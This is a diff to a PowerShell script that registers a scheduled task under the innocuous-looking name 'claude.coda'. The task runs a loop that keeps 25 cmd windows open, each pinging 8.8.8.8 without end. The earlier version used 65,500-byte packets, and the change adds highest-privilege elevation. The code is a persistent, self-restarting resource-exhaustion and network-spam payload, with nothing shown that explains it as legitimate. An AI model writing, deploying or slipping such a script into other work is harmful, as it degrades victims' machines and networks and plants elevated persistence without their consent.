@@ -1,12 +1,12 @@
 $TaskName = "claude.coda"
 
-# --- Watcher: mantiene 25 cmd con ping abiertos ---
+# --- Watcher: mantiene 25 cmd con ping continuo ---
 $watcher = @'
 while ($true) {
     try {
         $running = (Get-Process cmd -ErrorAction SilentlyContinue).Count
         while ($running -lt 25) {
-            Start-Process cmd -ArgumentList '/c ping -t -l 65500 8.8.8.8' -WindowStyle Normal
+            Start-Process cmd -ArgumentList '/c ping -t 8.8.8.8' -WindowStyle Normal
             $running++
         }
     } catch {}
@@ -31,7 +31,8 @@ $Settings = New-ScheduledTaskSettingsSet `
 
 $Principal = New-ScheduledTaskPrincipal `
     -UserId $env:USERNAME `
-    -LogonType Interactive
+    -LogonType Interactive `
+    -RunLevel Highest
 
 try {
     Register-ScheduledTask `
